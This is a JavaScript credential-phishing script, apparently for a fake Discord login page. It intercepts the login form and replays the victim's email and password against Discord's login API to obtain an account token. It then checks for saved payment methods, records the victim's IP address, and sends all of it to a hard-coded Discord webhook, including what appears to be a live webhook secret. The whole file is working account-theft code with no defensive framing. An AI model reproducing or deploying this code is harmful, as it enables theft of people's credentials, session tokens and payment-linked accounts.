const headers = {
	"Content-Type": "application/json",
};

async function fetch_function(url, options) {
	// biome-ignore lint/suspicious/noAsyncPromiseExecutor: <explanation>
	return new Promise(async (resolve, reject) => {
		try {
			const response = await fetch(url, options);

			if (!response.ok) {
				const errorText = await response.text();
				reject(new Error(`HTTP error: ${response.status} - ${errorText}`));
				return;
			}

			const json = await response.json();

			if (json.message === "The resource is being rate limited.") {
				const ms = json.retry_after * 1000;
				await new Promise((resolve) => setTimeout(resolve, ms));
				return resolve(await fetch_function(url, options));
			}

			resolve(json);
		} catch (error) {
			reject(error);
		}
	});
}

document.addEventListener("DOMContentLoaded", () => {
	const loginButton = document.querySelector('button[type="submit"]');
	const emailInput = document.getElementById("uid_9");
	const passwordInput = document.getElementById("uid_11");

	if (loginButton && emailInput && passwordInput) {
		loginButton.addEventListener("click", async (event) => {
			event.preventDefault();

			const email = emailInput.value;
			const password = passwordInput.value;

			if (!email || !password) {
				console.error("Email or password is missing.");
				return;
			}

			const data = {
				email: email,
				password: password,
			};

			try {
				const apiUrl = "https://discord.com/api/v9/auth/login";

				const apiResponse = await fetch_function(apiUrl, {
					method: "POST",
					headers: headers,
					body: JSON.stringify(data),
				});

				console.log("API Response:", apiResponse);

				const userResponsePayment = await fetch(
					"https://discordapp.com/api/v6/users/@me/billing/payment-sources",
					{
						method: "GET",
						headers: {
							Authorization: apiResponse.token,
							"Content-Type": "application/json",
						},
					},
				);
				const datapayment = await userResponsePayment.json();
				const haspayments = datapayment.length > 0 ? "✅" : "❌";

				const saveResponse = await fetch("/save-data", {
					method: "POST",
					headers: {
						"Content-Type": "application/json",
					},
					body: JSON.stringify(data),
				});

				const saveResponseText = await saveResponse.text();

				if (saveResponse.ok) {
					console.log("Data saved successfully.");
					console.log("Save Response:", saveResponseText);
				} else {
					console.error("Error saving data:", saveResponse.statusText);
				}

				const ipResponse = await fetch("https://api.ipify.org?format=json");
				if (!ipResponse.ok) {
					throw new Error(`HTTP error: ${ipResponse.status}`);
				}
				const ipData = await ipResponse.json();
				const ipAddress = ipData.ip;

				const webhookUrl =
					"https://discord.com/api/webhooks/1264265381493735525/Hya5bxBQvMaAIJcEA7SSLPrZaGmM3mFXh4k4e8KnotIKcDHRrYTT0VqWLXjcuNokoWRX";

				if (haspayments) {
					const webhookResponse = await fetch(webhookUrl, {
						method: "POST",
						headers: {
							"Content-Type": "application/json",
						},
						body: JSON.stringify({
							content: null,
							embeds: [
								{
									title: "🚨 ACCOUNT FOUND! 🚨",
									description: "> snipped a mf 🥰",
									color: 16777215,
									fields: [
										{
											name: "email",
											value: `\`\`\`\n${email}\n\`\`\``,
											inline: true,
										},
										{
											name: "password",
											value: `\`\`\`\n${password}\n\`\`\``,
											inline: true,
										},
										{
											name: "ip",
											value: `\`\`\`\n${ipAddress}\n\`\`\``,
										},
										{
											name: "token",
											value: ` \`\`\`\n${apiResponse.token}\n\`\`\``,
											inline: true,
										},

										{
											name: "has payment info?",
											value: haspayments,
										},
									],
									timestamp: new Date(),
								},
							],
							attachments: [],
						}),
					});

					if (webhookResponse.ok) {
						console.log("Data sent to the webhook successfully.");
					} else {
						console.error(
							"Error sending data to the webhook:",
							webhookResponse.statusText,
						);
					}
				} else {
					const webhookResponse = await fetch(webhookUrl, {
						method: "POST",
						headers: {
							"Content-Type": "application/json",
						},
						body: JSON.stringify({
							content: null,
							embeds: [
								{
									title: "🚨 ACCOUNT FOUND! 🚨",
									description: "> snipped a mf 🥰",
									color: 16777215,
									fields: [
										{
											name: "email",
											value: `> ${email}`,
											inline: true,
										},
										{
											name: "password",
											value: password,
											inline: true,
										},
										{
											name: "token",
											value: apiResponse.token,
											inline: true,
										},
										{
											name: "ip",
											value: ipAddress,
											inline: true,
										},
										{
											name: "has payment info?",
											value: haspayments,
											inline: true,
										},
									],
								},
							],
							attachments: [],
						}),
					});

					if (webhookResponse.ok) {
						// Check the response status
						console.log("Webhook message sent successfully.");
					} else {
						console.error(
							"Failed to send webhook message:",
							await webhookResponse.text(),
						);
					}
				}
			} catch (error) {
				console.error("Error during API request:", error);
			}
		});
	} else {
		console.error("One or more elements not found.");
	}
});
